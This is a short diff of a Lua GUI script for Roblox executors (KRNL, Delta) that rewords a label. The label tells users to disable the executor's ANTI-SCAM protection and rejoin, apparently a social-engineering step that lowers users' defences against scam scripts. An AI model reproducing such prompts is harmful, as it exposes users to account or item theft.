@@ -43,8 +43,8 @@ desc.Size = UDim2.new(1, 0, 0, 40)
 desc.BackgroundTransparency = 1
 desc.TextWrapped = true
 desc.Text = executor == "krnl"
-    and "Disable ANTI-SCAM in KRNL settings to ensure proper code functionality"
-    or "Disable ANTI-SCAM in Delta settings to ensure proper code functionality"
+    and "Disable ANTI-SCAM in KRNL settings, leave, then rejoin, to ensure proper code functionality"
+    or "Disable ANTI-SCAM in Delta settings, leave, then rejoin to ensure proper code functionality"
 desc.TextColor3 = Color3.fromRGB(60, 60, 60)
 desc.Font = Enum.Font.Gotham
 desc.TextSize = 14
